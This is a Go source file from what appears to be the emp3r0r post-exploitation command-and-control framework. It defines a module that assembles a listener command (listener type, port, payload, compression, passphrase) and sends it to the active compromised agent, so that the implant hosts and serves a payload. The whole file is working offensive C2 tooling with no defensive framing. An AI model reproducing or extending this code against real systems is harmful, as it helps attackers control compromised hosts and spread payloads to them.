package modules

import (
	"fmt"

	"github.com/fatih/color"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/agents"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/internal/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func modListener() {
	if def.AvailableModuleOptions["listener"] == nil || def.AvailableModuleOptions["port"] == nil || def.AvailableModuleOptions["payload"] == nil || def.AvailableModuleOptions["compression"] == nil || def.AvailableModuleOptions["passphrase"] == nil {
		logging.Errorf("One or more required options are nil")
		return
	}
	cmd := fmt.Sprintf("%s --listener %s --port %s --payload %s --compression %s --passphrase %s",
		emp3r0r_def.C2CmdListener,
		def.AvailableModuleOptions["listener"].Val,
		def.AvailableModuleOptions["port"].Val,
		def.AvailableModuleOptions["payload"].Val,
		def.AvailableModuleOptions["compression"].Val,
		def.AvailableModuleOptions["passphrase"].Val)
	err := agents.SendCmd(cmd, "", def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
	color.HiMagenta("Please wait for agent's response...")
}
